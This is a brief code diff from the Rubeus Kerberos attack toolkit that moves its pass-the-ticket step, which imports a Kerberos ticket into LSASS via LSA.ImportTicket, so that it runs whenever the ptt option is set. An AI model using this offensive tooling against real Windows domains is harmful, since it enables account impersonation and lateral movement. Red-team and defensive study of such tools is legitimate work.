@@ -165,17 +165,13 @@ namespace Rubeus
                     {
                         Console.WriteLine("      {0}", line);
                     }
-                    if (ptt)
-                    {
-                        // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes);
-                    }
-                    return kirbiBytes;
                 }
-                else
+                if (ptt)
                 {
-                    return kirbiBytes;
+                    // pass-the-ticket -> import into LSASS
+                    LSA.ImportTicket(kirbiBytes);
                 }
+                return kirbiBytes;
             }
             else if (responseTag == 30)
             {
